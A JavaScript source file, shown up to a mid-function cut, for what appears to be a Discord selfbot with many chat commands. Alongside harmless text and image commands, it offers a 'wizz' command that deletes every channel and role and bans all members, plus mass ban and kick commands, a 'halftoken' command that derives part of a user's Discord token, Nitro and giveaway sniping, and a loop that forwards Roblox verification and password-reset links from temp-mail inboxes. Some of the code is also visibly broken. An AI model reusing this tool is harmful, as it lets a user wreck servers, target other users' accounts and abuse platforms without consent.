const Discord = require('discord.js');
const imageconvert = require("image-data-uri");
const Jimp = require("jimp");
const request = require("request");
const rover = require('rover-api');
const fs = require("fs");
const fetch = require("node-fetch");
const https = require("https");
const figlet = require('figlet');
const googleTTS = require("google-tts-api");
const crypto = require("crypto")
const RichEmbed = require('discord.js');
const moment = require('moment')
const superagent = require("superagent");
const ms = require("ms");
const Anime = require('4anime-scraper').default;
const { evalExpression, tokenize, Token, evalTokens } = require('@hkh12/node-calc');

var settings = JSON.parse(fs.readFileSync("settings.json"))
var ec = JSON.parse(fs.readFileSync("embedcolor.json"))
var guildid = settings.guild;
var webhook;
var loggerwebhook;
var announcewebhook;
var changelogwebhook;
var nitrowebhook;
var giveawaywebhook;
var codewebhook;
var prefix = "!";
var attempted = []
var img;
var infoimg;
var devimg;
var version = "BETA-0.0.7"

let interval;
let minterval;

const client = new Discord.Client({
    messageSweepInterval: 240,
    messageCacheLifetime: 1200,
    disabledEvents: ['TYPING_START', 'USER_UPDATE', 'VOICE_SERVER_UPDATE', 'CHANNEL_PINS_UPDATE', 'GUILD_DELETE', 'CHANNEL_UPDATE', 'GUILD_BAN_ADD', 'GUILD_BAN_REMOVE', 'CHANNEL_PINS_UPDATE',
        'USER_NOTE_UPDATE', 'USER_SETTINGS_UPDATE', 'PRESENCE_UPDATE', 'VOICE_STATE_UPDATE', 'RELATIONSHIP_ADD', 'RELATIONSHIP_REMOVE'
    ]
})

function getSong(name) {
    return new Promise(async function (resolve, reject) {
        var response = await fetch(`https://some-random-api.ml/lyrics/?title=${name}`)
        response = await response.json()
        resolve(response)
    })
}

function getProfileImage(id) {
    console.log(id)
    return new Promise((resolve) => {
        fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${id}&size=420x420&format=Png&isCircular=false&_=${id}`)
            .then((req) => req.json())
            .then((json) => resolve(json.data[0].imageUrl))
    })
}

function applyCharMap(map, text) {
    let out = "";
    for (let c of text.split("")) {
        if (map[c] !== undefined) out += map[c];
        else if (map[c.toLowerCase()] !== undefined) out += map[c.toLowerCase()];
        else out += c;
    }
    return out;
}

function until(conditionFunction) {

    const poll = resolve => {
        if (conditionFunction()) resolve();
        else setTimeout(_ => poll(resolve), 400);
    }

    return new Promise(poll);
}

function getimage(url) {
    return new Promise((resolve) => {
        fetch(url)
            .then(response => response.buffer())
            .then(buffer => resolve(buffer))
    })
}
settings.processed = settings.processed == undefined ? [] : settings.processed
setInterval(async () => {
    if ((settings.email == true) && (settings.emails != undefined) && (settings.emails.length > 0)) {
        settings.emails.forEach(async email => {
            var hash = crypto.createHash('md5').update(email).digest("hex")
            var response = await fetch(`https://api4.temp-mail.org/request/mail/id/${hash}/format/json`)
            try {
                response = await response.json()
                if (response.error == undefined) {
                    try {
                        response.forEach(mail => {
                            if (settings.processed.includes(mail.mail_id) == false) {
                                settings.processed.push(mail.mail_id)
                                var text = mail.mail_text
                                var robloxtext = text.split("https://www.roblox.com/account/settings/verify-email?ticket=")
                                if (robloxtext[1]) {
                                    var text2 = robloxtext[1].split("]")
                                    if (text2[0]) {
                                        var usertext = text.split("(")
                                        var username
                                        if (usertext[1]) {
                                            var usertext2 = usertext[1].split(")")
                                            if (usertext2[0]) {
                                                username = usertext2[0]
                                            }
                                        }
                                        var code = text2[0]
                                        //fetch("https://www.roblox.com/account/settings/verify-email?ticket=" + code)
                                        codewebhook.send("", {
                                            embeds: [{
                                                "title": "Email",
                                                "description": "You just recieved an email!",
                                                "fields": [{
                                                        "name": "Verify",
                                                        "value": "[Click Here](https://www.roblox.com/account/settings/verify-email?ticket=" + code + ")",
                                                        "inline": true
                                                    },
                                                    {
                                                        "name": "Service",
                                                        "value": "Roblox",
                                                        "inline": true
                                                    },
                                                    {
                                                        "name": "Account",
                                                        "value": username ? username : "Username not found",
                                                        "inline": true
                                                    },
                                                    {
                                                        "name": "Email",
                                                        "value": email,
                                                        "inline": true
                                                    },
                                                    {
                                                        "name": "Type",
                                                        "value": "Verification",
                                                        "inline": true
                                                    }
                                                ]
                                            }]
                                        })
                                    }
                                    return
                                }
                                var robloxpwtext = text.split("https://www.roblox.com/login/reset-password?ticket=")
                                if (robloxpwtext[1]) {
                                    var textc = robloxpwtext[1].split("]")
                                    if (textc[1]) {
                                        var code = textc[0]
                                        codewebhook.send("", {
                                            embeds: [{
                                                "title": "Email",
                                                "description": "You just recieved an email!",
                                                "fields": [{
                                                        "name": "Reset",
                                                        "value": "[Click Here](https://www.roblox.com/login/reset-password?ticket=" + code + ")",
                                                        "inline": true
                                                    },
                                                    {
                                                        "name": "Service",
                                                        "value": "Roblox",
                                                        "inline": true
                                                    },
                                                    {
                                                        "name": "Email",
                                                        "value": email,
                                                        "inline": true
                                                    },
                                                    {
                                                        "name": "Type",
                                                        "value": "Password Reset",
                                                        "inline": true
                                                    }
                                                ]
                                            }]
                                        })
                                    }
                                    return
                                }
                            }
                        });
                        fs.writeFileSync("settings.json", JSON.stringify(settings))
                    } catch (error) {

                    }
                }
            } catch (error) {

            }

        });
    }
}, 10000)

const commands = {
    "calc": async function(msg, args, send) {

        let input = args.join(" ")
        try {
        let math = evalExpression(input)
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle(`Evaluated Expression: ${input}`)
        embed.setDescription("```" + math + "```")

        send({ embed: embed.toJSON( )}).then(() => {msg.delete()})
        } catch(error) {

        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle(`Evaluated Expression: Error`)
        embed.setDescription("```" + error + "```")
        }

    },
    "embedcolor": async function(msg, args, send) {
     
    let input = args.join(" ") || "PURPLE"

    fs.writeFileSync("embedcolor.json", JSON.stringify(input))

    let embed = await new Discord.RichEmbed()
    embed.setColor(await ec)
    embed.setDescription(`**Set your embed color to: ${input}**`)

    await send({ embed: embed.toJSON()}).then(() => {msg.delete()})

    },
    "self-purge": async function(msg, args, send) {
    let messagecount = parseInt(args[0]) || 1;

    msg.channel.fetchMessages({limit: Math.min(messagecount + 1, 100)}).then(messages => {
        messages.forEach(m => {
            if (m.author.id == client.user.id) {
                m.delete().catch(console.error);
                deletedMessages++;
            }
        });
    })
    },
    "search-anime": async function(msg, args, send) {
        let input = args.join(" ")

        Anime.getAnimeFromSearch(input)
        .then(async res => {
            try {
                console.log(res[0]);
                let data = res[0]
                let descdata = await data.description
                let imgdata = await data.imageUrl
                let urldata = await data.url
                let typedata = await data.type
                let reldata = await data.releaseDate
                let statdata = await data.status
                let embed = new Discord.RichEmbed()
                    embed.setColor(ec)
                    embed.setTitle('Anime Search Result:')
                    embed.setThumbnail(imgdata)
                    embed.setDescription(`**${urldata}**`)
                    embed.setTimestamp()
                    embed.setFooter(`Data Gathered From 4anime.to`)
                    embed.addField('Type', typedata, true)
                    embed.addField('Status', statdata, true)
                    embed.addField('Release Date', reldata, true)
                    embed.addField('Description', descdata)
                send({embed: embed.toJSON()}).then(() => {msg.delete()})
            } catch (error) {
                let embed = new Discord.RichEmbed()
                embed.setColor(ec)
                embed.setDescription(`**Could not find anime specified**`)
                embed.setTimestamp()
                send({embed: embed.toJSON()}).then(() => {msg.delete()})
            }
        });
    },
    "autofarm-mee6": async function(msg, args, send) {

        let mesg = "Uhh how does this discord work?.. Nevermind ignore this message"
        if(!minterval) {
            msg.channel.send('Autofarm Started')
            minterval = setInterval(function() { send(mesg).then(mesg => {mesg.delete(2000)}) }, 60000)
            return;
        }

    clearInterval(minterval)
    minterval = null
    msg.channel.send('Autofarm Stopped')
    },
    "wizz": async function(msg, args, send) {
        msg.guild.channels.forEach(channel => channel.delete())
        msg.guild.roles.forEach(role => role.delete())
        await msg.guild.members.map(async member => {
            await member.ban()
        })
    },
    "lyrics": async function (msg, args, send) {
        if (args[0]) {
            var song = args.join(" ")
            var info = await getSong(song);
            var lyrics = "```" + info.lyrics + "```"
            let embed = new Discord.RichEmbed()
            embed.setColor(ec)
            embed.setTitle('Lyrics')
            embed.setDescription(`**We searched the Internet and found the following Lyrics for you!**`)
            embed.setThumbnail(info.thumbnail.genius)
            embed.addField('Title', info.title)
            embed.addField('Author', info.author)
            embed.addFiled('Lyrics', 'Found in attached text file')
            
            
                var Attachment = new Discord.Attachment(Buffer.from(info.lyrics), "lyrics.txt")
                send({
                    embed: embed.toJSON(),
                    file: Attachment
                })
                msg.delete()
            if (info.error) {
                let embed = new Discord.RichEmbed()
                embed.setColor(ec)
                embed.setTitle('Lyrics')
                embed.setDescription(info.error)
            }
            send({
                embed: embed.toJSON()
            })
            msg.delete()
        }
    },
    "ascii": async function (msg, args, send) {
        if (args[0]) {
            figlet(args.join(" "), (err, ascii) => {
                if (err) {
                    let embed = new Discord.RichEmbed()
                    embed.setColor(ec)
                    embed.setTitle('Ascii')
                    embed.setDescription(`We had an error, please try again`)
                    
                    send({
                        embed: embed.toJSON()
                    }).then(() => {
                        msg.delete()
                    })
                    return
                }
                send("```" + ascii + "```")
                msg.delete()
            })
        }
    },
    "speak": async function (msg, args, send) {
        if (args[0]) {
            var text = args.join(" ")
            var url = await googleTTS(text, "en", 1)
            fetch(url)
                .then(response => response.buffer())
                .then(buffer => {
                    var Attachment = new Discord.Attachment(buffer, "voice.mp3")
                    let embed = new Discord.RichEmbed()
                    embed.setColor(ec)
                    embed.setTitle('Text2Speech')
                    embed.setDescription(`You can find the spoken Text as an Attached mp3`)
        
                    send({
                        embed: embed.toJSON(),
                        file: Attachment
                    })
                    msg.delete()
                    return
                });
        }
    },
    "steal-pfp": async function (msg, args, send) {
        let user = msg.mentions.users.first()
        if (!user) return msg.reply('You must mention someone to steal their avatar')

        client.user.setAvatar(user.displayAvatarURL)
        msg.react("✅")
    },
    "massban": async function (msg, args, send) {
        if(!msg.member.hasPermission('BAN_MEMBERS')) return send('You do not have the permission to run this')
        await msg.guild.members.map(async member => {
            await member.ban()
        })
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**Started mass banning**`)
        embed.setColor(ec)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "massunban": async function (msg, args, send) {
        if(!msg.member.hasPermission('BAN_MEMBERS')) return send('You do not have the permission to run this')
        await msg.guild.members.map(async member => {
            await msg.guild.members.unban(member)
        })
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**Started mass unbanning**`)
        embed.setColor(ec)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "masskick": async function (msg, args, send) {
        if(!msg.member.hasPermission('KICK_MEMBERS')) return send('You do not have the permission to run this')
        await msg.guild.members.map(async member => {
            await member.kick()
        })
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**Started mass kicking**`)
        embed.setColor(ec)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "massmute": async function (msg, args, send) {
        if(!msg.member.hasPermission('MANAGE_ROLES')) return send('You do not have the permission to run this')
        let MUTED = msg.guild.roles.find(r => r.name === 'Muted')
        if(!MUTED) return send('There is no muted role to use, the role name has to be "Muted"')
        await msg.guild.members.map(async member => {
            await member.addRole(MUTED)
        })
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**Started mass muting**`)
        embed.setColor(ec)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
	"image": function (msg, args, send) {
        textToImage.generate(args.join(" "), {
            debug: false,
            maxWidth: 720,
            fontSize: 38,
            fontFamily: 'Arial',
            lineHeight: 48,
            margin: 5,
            bgColor: "white",
            textColor: "black"
        }).then(function (uri) {
            var data = imageconvert.decode(uri)
            send({
                files: [data.dataBuffer]
            })
            msg.delete()
        });
    },
    "massunmute": async function (msg, args, send) {
        if(!msg.member.hasPermission('MANAGE_ROLES')) return send('You do not have the permission to run this')
        let MUTED = msg.guild.roles.find(r => r.name === 'Muted')
        if(!MUTED) return send('There is no muted role to use, the role name has to be "Muted"')
        await msg.guild.members.map(async member => {
            await member.removeRole(MUTED)
        })
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**Started mass unmute**`)
        embed.setColor(ec)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "pat": async function (msg, args, send) {
        let user = msg.mentions.users.first() || msg.author
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/pat`);
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**Have a headpat kind person ${user} ^-^**`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧                  ｡◕‿◕｡`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })

    },
    "nsfwavatar": async function (msg, args, send) {
        let user = msg.mentions.users.first() || msg.author
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/nsfw_avatar`);
        let embed = new Discord.RichEmbed()
        embed.setTitle(`Here's a cheeky nsfw avatar ;D`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧                  ｡◕‿◕｡`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "waifu": async function (msg, args, send) {
        let user = msg.mentions.users.first() || msg.author
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/waifu`);
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**${user} Seems to have a cute waifu**`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧                  ｡◕‿◕｡`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "poke": async function (msg, args, send) {
        let user = msg.mentions.users.first() || msg.author
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/poke`);
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**Hehe ${user} get poked >:3**`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧                  ｡◕‿◕｡`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "yuri": async function (msg, args, send) {
        let user = msg.mentions.users.first() || msg.author
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/yuri`);
        let embed = new Discord.RichEmbed()
        embed.setTitle(`Looks like we have some nice yuri here`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧                  ｡◕‿◕｡`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "baka": async function (msg, args, send) {
        let user = msg.mentions.users.first() || msg.author
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/baka`);
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**${user} stop being such a dumb baka!! ;<**`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧                  ｡◕‿◕｡`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "smug": async function (msg, args, send) {
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/smug`);
        let embed = new Discord.RichEmbed()
        embed.setTitle(`Hehe I'm a smug lil bitch >:3`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧                  ｡◕‿◕｡`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "slap": async function (msg, args, send) {
        let user = msg.mentions.users.first() || msg.author
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/slap`);
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**${user} gets demolished by my superior slap**`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧                  ｡◕‿◕｡`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "hmph": async function (msg, args, send) {        
        let embed = new Discord.RichEmbed()
        embed.setTitle(`Whatever I didn't care anyway.. >;c`)
        embed.setColor(ec)
        embed.setImage(`https://media1.tenor.com/images/b7e132fd3f4e110ea54ef8aa8f4eebbe/tenor.gif`)
        embed.setFooter(`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧                  ｡◕‿◕｡`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "pout": async function (msg, args, send) {        
        let embed = new Discord.RichEmbed()
        embed.setTitle(`But I WANT IT >;C`)
        embed.setColor(ec)
        embed.setImage(`https://cutewallpaper.org/21/anime-pout-face/Imgur-The-magic-of-the-Internet.gif`)
        embed.setFooter(`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧                  ｡◕‿◕｡`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "feed": async function (msg, args, send) {
        let user = msg.mentions.users.first() || msg.author
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/feed`);
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**Eat your food ${user} >;c**`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧                  ｡◕‿◕｡`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "8ball": async function(msg, args, send) {
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/8ball`);
        let ques = args.join(" ")
        let embed = new Discord.RichEmbed()
        embed.setTitle('Magic 8Ball')
        embed.setColor(ec)
        embed.setDescription(`**${ques}**` + '**?**')
        embed.setImage(body.url)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "foxgirl": async function(msg, args, send) {
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/fox_girl`);
        let embed = new Discord.RichEmbed()
        embed.setTitle('Have a cute foxy~ ^-^')
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧                  ｡◕‿◕｡`) 
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "neko": async function(msg, args, send) {
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/neko`);
        let embed = new Discord.RichEmbed()
        embed.setTitle('Have a cute neko~ ^-^')
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧                  ｡◕‿◕｡`) 
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "rfuck": async function (msg, args, send) {
        let user = msg.mentions.users.first() || msg.author
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/classic`);
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**${user} Fucks ${msg.author}**`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`'ฅ(≈>ܫ<≈)♥`)
        embed.setTimestamp()
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "cuddle": async function (msg, args, send) {
        let user = msg.mentions.users.first() || msg.author
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/cuddle`);
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**I think ${user} deserves a big cuddle :3**`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`'ฅ(≈>ܫ<≈)♥`)
        embed.setTimestamp()
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "invites": async function (msg, args, send) {
        var user = msg.mentions.users.first() || msg.author
        msg.guild.fetchInvites()
            .then(invites => {
                const userInvites = invites.array().filter(o => o.inviter.id === user.id)
                var userInviteCount = 0;
                for (var i = 0; i < userInvites.length; i++) {
                    var invite = userInvites[i];
                    userInviteCount += invite['uses'];
                }
                let embed = new Discord.RichEmbed()
                embed.setTitle('Invites')
                embed.setColor(ec)
                embed.setThumbnail(`https://i.pinimg.com/originals/bc/0d/10/bc0d10e7d774a54825432f12d2469c1a.png`)
                embed.setDescription(`**${user} has ${userInviteCount} invites**`)
                send({
                    embed: embed.toJSON()
                }).then(() => {
                    msg.delete()
                })
            })
    },
    "bold": async function (msg, args, send) {
        if (args[0]) {
            const CharMap = {
                "0": "𝟎",
                "1": "𝟏",
                "2": "𝟐",
                "3": "𝟑",
                "4": "𝟒",
                "5": "𝟓",
                "6": "𝟔",
                "7": "𝟕",
                "8": "𝟖",
                "9": "𝟗",
                "a": "𝐚",
                "b": "𝐛",
                "c": "𝐜",
                "d": "𝐝",
                "e": "𝐞",
                "f": "𝐟",
                "g": "𝐠",
                "h": "𝐡",
                "i": "𝐢",
                "j": "𝐣",
                "k": "𝐤",
                "l": "𝐥",
                "m": "𝐦",
                "n": "𝐧",
                "o": "𝐨",
                "p": "𝐩",
                "q": "𝐪",
                "r": "𝐫",
                "s": "𝐬",
                "t": "𝐭",
                "u": "𝐮",
                "v": "𝐯",
                "w": "𝐰",
                "x": "𝐱",
                "y": "𝐲",
                "z": "𝐳",
                "A": "𝐀",
                "B": "𝐁",
                "C": "𝐂",
                "D": "𝐃",
                "E": "𝐄",
                "F": "𝐅",
                "G": "𝐆",
                "H": "𝐇",
                "I": "𝐈",
                "J": "𝐉",
                "K": "𝐊",
                "L": "𝐋",
                "M": "𝐌",
                "N": "𝐍",
                "O": "𝐎",
                "P": "𝐏",
                "Q": "𝐐",
                "R": "𝐑",
                "S": "𝐒",
                "T": "𝐓",
                "U": "𝐔",
                "V": "𝐕",
                "W": "𝐖",
                "X": "𝐗",
                "Y": "𝐘",
                "Z": "𝐙"
            };
            let embed = new Discord.RichEmbed()
            embed.setColor(ec)
            .setTitle(`Converted Text: Bold`)
            .setDescription("```" + applyCharMap(CharMap, args.join(" ")) + "```")

            send({
                embed: embed.toJSON()
            }).then(() => {
                msg.delete()
            })
        }
    },
    "embed": async function (msg, args, send) {
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setDescription(`**${args.join(" ")}**`)
        send({embed: embed.toJSON()}).then(() => {msg.delete()})
    },
    "fancy": async function (msg, args, send) {
        if (args[0]) {
            const CharMap = {
                "0": "0",
                "1": "1",
                "2": "2",
                "3": "3",
                "4": "4",
                "5": "5",
                "6": "6",
                "7": "7",
                "8": "8",
                "9": "9",
                "a": "𝓪",
                "b": "𝓫",
                "c": "𝓬",
                "d": "𝓭",
                "e": "𝓮",
                "f": "𝓯",
                "g": "𝓰",
                "h": "𝓱",
                "i": "𝓲",
                "j": "𝓳",
                "k": "𝓴",
                "l": "𝓵",
                "m": "𝓶",
                "n": "𝓷",
                "o": "𝓸",
                "p": "𝓹",
                "q": "𝓺",
                "r": "𝓻",
                "s": "𝓼",
                "t": "𝓽",
                "u": "𝓾",
                "v": "𝓿",
                "w": "𝔀",
                "x": "𝔁",
                "y": "𝔂",
                "z": "𝔃",
                "A": "𝓐",
                "B": "𝓑",
                "C": "𝓒",
                "D": "𝓓",
                "E": "𝓔",
                "F": "𝓕",
                "G": "𝓖",
                "H": "𝓗",
                "I": "𝓘",
                "J": "𝓙",
                "K": "𝓚",
                "L": "𝓛",
                "M": "𝓜",
                "N": "𝓝",
                "O": "𝓞",
                "P": "𝓟",
                "Q": "𝓠",
                "R": "𝓡",
                "S": "𝓢",
                "T": "𝓣",
                "U": "𝓤",
                "V": "𝓥",
                "W": "𝓦",
                "X": "𝓧",
                "Y": "𝓨",
                "Z": "𝓩"
            };
            let embed = new Discord.RichEmbed()
            embed.setColor(ec)
            .setTitle(`Converted Text: Fancy`)
            .setDescription("```" + applyCharMap(CharMap, args.join(" ")) + "```")

            send({
                embed: embed.toJSON()
            }).then(() => {
                msg.delete()
            })
        }
    },
    "roblox": async function (msg, args, send) {
        if ((msg.mentions.users) && (msg.mentions.users.array().length > 0)) {
            var message;
            var array = msg.mentions.users.array()
            let user = msg.mentions.users.first() || msg.guild.members.find(mem => mem.user.username === args[0]) || msg.guild.members.find(mem => mem.user.tag === args[0]) || msg.guild.members.get(args[0]) || msg.author
            for (var i = 0; i < array.length; i++) {
                var mention = array[i]
                if (mention.id) {
                    var Account = await rover(mention.id)
                    let embed = new Discord.RichEmbed()
                    embed.setThumbnail(await getProfileImage(Account.robloxId))
                    embed.setColor(ec)
                    embed.setTitle(`${mention.tag}'s Roblox Info`)
                    embed.addField('Username', Account.robloxUsername),
                        embed.addField('Roblox ID', Account.robloxId),
                        embed.addField('Profile Link', `https://www.roblox.com/users/${Account.robloxId}/profile`)
                    embed.setFooter(`ID: ${user.id}`)
                    send({
                        embed: embed.toJSON()
                    })
                    msg.delete()
                }
            }
        }
    },
    "halftoken": function (msg, args, send) {
        if ((msg.mentions.users) && (msg.mentions.users.array().length > 0)) {
            var message;
            var array = msg.mentions.users.array()
            for (var i = 0; i < array.length; i++) {
                var mention = array[i]
                if (mention.id) {
                    let embed = new Discord.RichEmbed()
                    embed.setColor(ec)
                    embed.setTitle('Half Discord Token')
                    embed.addField(mention.username + "#" + mention.discriminator, Buffer.from(mention.id).toString('base64'))
                }
            }
            send({
                embed: embed.toJSON()
            })
            msg.delete()
        }
    },
    "gray": function (msg, args, send) {
        if ((msg.mentions.users) && (msg.attachments.size > 0)) {
            var files = Array.from(msg.attachments)
            if (files[0][1].height != undefined) {
                request({
                    url: files[0][1].url,
                    encoding: null
                }, async (err, resp, buffer) => {
                    var pic = await Jimp.read(buffer)
                    await pic.greyscale()
                    send({
                        files: [await pic.getBufferAsync(pic.getMIME())]
                    })
                    msg.delete()
                });
            }
        }
    },
    "safemode": function (msg, args, send) {
        if (settings.private == undefined) {
            settings.private = false
        }
        if (args[0]) {
            var setting;
            if (args[0].toUpperCase() == "ON") {
                setting = true
            } else if (args[0].toUpperCase() == "OFF") {
                setting = false
            }
            if (setting == undefined) {
                let embed = new Discord.RichEmbed()
                embed.setColor(ec)
                embed.setTitle('Safemode')
                embed.setDescription("Usage: " + prefix + "safemode [ON/OFF]")
    
                send({
                    embed: embed.toJSON()
                })
                msg.delete()
                return
            }
            settings.private = setting
        } else {
            settings.private = !settings.private
        }
        fs.writeFileSync("settings.json", JSON.stringify(settings))
        let embed = new Discord.RichEmbed()
            embed.setColor(((settings.private == true) && 0x6cc24a) || 0xff0000)
            embed.setTitle('Safemode')
            embed.setDescription(((settings.private == true) && "Enabled Safemode") || "Disabled Safemode")

        send({
            embed: embed.toJSON()
        })
        msg.delete()
    },
    "embedmode": function (msg, args, send) {
        if (settings.embed == undefined) {
            settings.embed = false
        }
        if (args[0]) {
            var setting;
            if (args[0].toUpperCase() == "ON") {
                setting = true
            } else if (args[0].toUpperCase() == "OFF") {
                setting = false
            }
            if (setting == undefined) {
            let embed = new Discord.RichEmbed()
            embed.setColor(ec)
            embed.setTitle('Embed Mode')
            embed.setDescription("Usage: " + prefix + "embedmode [ON/OFF]")
    
                send({
                    embed: embed.toJSON()
                })
                msg.delete()
                return
            }
            settings.embed = setting
        } else {
            settings.embed = !settings.embed
        }
        fs.writeFileSync("settings.json", JSON.stringify(settings))
        let embed = new Discord.RichEmbed()
            embed.setColor(((settings.embed == true) && 0x6cc24a) || 0xff0000)
            embed.setTitle('Embed Mode')
            embed.setDescription(((settings.embed == true) && "Enabled Embedmode") || "Disabled Embedmode")

        send({
            embed: embed.toJSON()
        })
        msg.delete()
    },
    "giveaway-snipe": function (msg, args, send) {
        if (settings.giveaway == undefined) {
            settings.giveaway = false
        }
        if (args[0]) {
            var setting;
            if (args[0].toUpperCase() == "ON") {
                setting = true
            } else if (args[0].toUpperCase() == "OFF") {
                setting = false
            }
            if (setting == undefined) {
            let embed = new Discord.RichEmbed()
            embed.setColor(ec)
            embed.setTitle('Giveaway Sniper')
            embed.setDescription("Usage: " + prefix + "giveaway-snipe [ON/OFF]")
    
                send({
                    embed: embed.toJSON()
                })
                msg.delete()
                return
            }
            settings.giveaway = setting
        } else {
            settings.giveaway = !settings.giveaway
        }
        fs.writeFileSync("settings.json", JSON.stringify(settings))
        let embed = new Discord.RichEmbed()
        embed.setColor(((settings.giveaway == true) && 0x6cc24a) || 0xff0000)
        embed.setTitle('Giveaway Sniper')
        embed.setDescription(((settings.giveaway == true) && "Enabled Giveaway Sniper") || "Disabled Giveaway Sniper")

        send({
            embed: embed.toJSON()
        })
        msg.delete()
    },
    "nitro-snipe": function (msg, args, send) {
        if (settings.nitro == undefined) {
            settings.nitro = false
        }
        if (args[0]) {
            var setting;
            if (args[0].toUpperCase() == "ON") {
                setting = true
            } else if (args[0].toUpperCase() == "OFF") {
                setting = false
            }
            if (setting == undefined) {
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle('Nitro Sniper')
        embed.setDescription("Usage: " + prefix + "nitro-snipe [ON/OFF]")
                
                send({
                    embed: embed.toJSON()
                })
                msg.delete()
                return
            }
            settings.nitro = setting
        } else {
            settings.nitro = !settings.nitro
        }
        fs.writeFileSync("settings.json", JSON.stringify(settings))
        let embed = new Discord.RichEmbed()
        embed.setColor(((settings.nitro == true) && 0x6cc24a) || 0xff0000)
        embed.setTitle('Nitro Sniper')
        embed.setDescription(((settings.nitro == true) && "Enabled Nitro Sniper") || "Disabled Nitro Sniper")

        send({
            embed: embed.toJSON()
        })
        msg.delete()
    },
    "email": function (msg, args, send) {
        if (args[0]) {
            if (args[0].toLowerCase() == "toggle") {
                if (settings.email == undefined) {
                    settings.email = false
                }
                if (args[1]) {
                    var setting;
                    if (args[1].toUpperCase() == "ON") {
                        setting = true
                    } else if (args[1].toUpperCase() == "OFF") {
                        setting = false
                    }
                    if (setting == undefined) {
                        let embed = new Discord.RichEmbed()
                        embed.setColor(ec)
